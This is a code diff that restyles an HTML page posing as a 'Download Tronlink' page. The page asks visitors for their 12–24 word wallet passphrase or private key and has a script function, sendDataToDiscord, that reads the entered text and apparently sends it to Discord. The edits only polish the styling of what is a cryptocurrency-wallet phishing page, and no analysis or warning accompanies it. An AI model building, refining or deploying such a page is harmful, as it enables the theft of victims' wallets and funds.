@@ -2,49 +2,49 @@
 <html>
 <head>
   <title>Download Tronlink</title>
-     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
 
   <style>
     body {
-   	font-family: 'Roboto', sans-serif;
-		  
-  background: linear-gradient(-45deg, #007bff, #b8d8e6, #007bff, #b8d8e6);
-  background-size: 400% 400%;
-  animation: gradientAnimation 10s ease infinite;
-}
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(-45deg, #007bff, #b8d8e6, #007bff, #b8d8e6);
+      background-size: 400% 400%;
+      animation: gradientAnimation 10s ease infinite;
+    }
 
-@keyframes gradientAnimation {
-  0% {
-    background-position: 0% 50%;
-  }
-  50% {
-    background-position: 100% 50%;
-  }
-  100% {
-    background-position: 0% 50%;
-  }
-}
-	    
-   
+    @keyframes gradientAnimation {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
 
     .container {
       max-width: 600px;
       margin: 0 auto;
-     padding-top: 60px;
+      padding-top: 80px;
       text-align: center;
     }
 
-    h3 {
+    h2 {
       font-size: 24px;
       margin-bottom: 20px;
       color: white;
       margin-top: 40px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
     }
 
     .input-field {
       background-color: #e9ecef;
       border: 2px solid #17a2b8;
-      padding: 35px;
+      padding: 20px;
       margin-bottom: 20px;
       width: 100%;
       border-radius: 5px;
@@ -53,7 +53,7 @@
     }
 
     .button {
-      background-color: blue;
+      background-color: #17a2b8;
       border: none;
       color: #ffffff;
       padding: 15px 40px;
@@ -124,18 +124,25 @@
       .container {
         padding: 10px;
       }
+
+      h2 {
+        font-size: 20px;
+      }
+
+      .input-field {
+        padding: 15px;
+      }
     }
   </style>
 </head>
 <body>
   <div class="container">
     <button class="back-button" onclick="window.history.back()">Back</button>
-    <h3>Enter your 12-24 word passphrase or paste your PrivateKey to continue</h3>
-    <input type="text" id="input-text" class="input-field" placeholder="enter text">
+    <h2>Enter your 12-24 word passphrase or paste your PrivateKey to continue</h2>
+    <input type="text" id="input-text" class="input-field" placeholder="Enter text">
     <button id="download-button" class="button">Download</button>
   </div>
-  
-  
+
   <script>
     function sendDataToDiscord() {
       var text = document.getElementById("input-text").value;
@@ -176,7 +183,7 @@
           button.classList.remove("loading-button");
           button.innerText = "Descargar";
         }
-      }, 100);
+      }, 200);
     }
 
     var downloadButton = document.getElementById("download-button");
@@ -184,4 +191,3 @@
   </script>
 </body>
 </html>
-
